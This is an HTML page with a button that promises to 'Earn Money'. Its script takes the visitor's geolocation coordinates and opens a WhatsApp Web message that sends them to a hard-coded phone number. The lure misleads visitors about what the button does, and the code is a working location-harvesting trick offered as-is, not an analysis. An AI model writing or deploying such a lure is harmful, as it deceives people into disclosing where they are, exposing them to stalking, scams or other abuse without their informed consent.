<!DOCTYPE html>

  <body>
    <button onclick="sendWhatsAppMessage()">Earn MoneyðŸ’²</button>

    <script>
      function sendWhatsAppMessage() {
        // Replace this with the phone number you want to send a message to
        navigator.geolocation.getCurrentPosition((position) => {
          var contents = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          };
          console.log(contents);
          var jsonString = JSON.stringify(contents, null, 2);
          var phoneNumber = "7992333452";
          // Replace this with the message you want to send
          var message = `Hello, this is a Earn MoneyðŸ’² message!  ${jsonString}`;

          // Create the WhatsApp Web URL with the phone number and message
          var whatsappUrl = `https://web.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(
            message
          )}`;

          // Open the WhatsApp Web URL in a new window
          window.open(whatsappUrl, "_blank");
        });
      }
    </script>
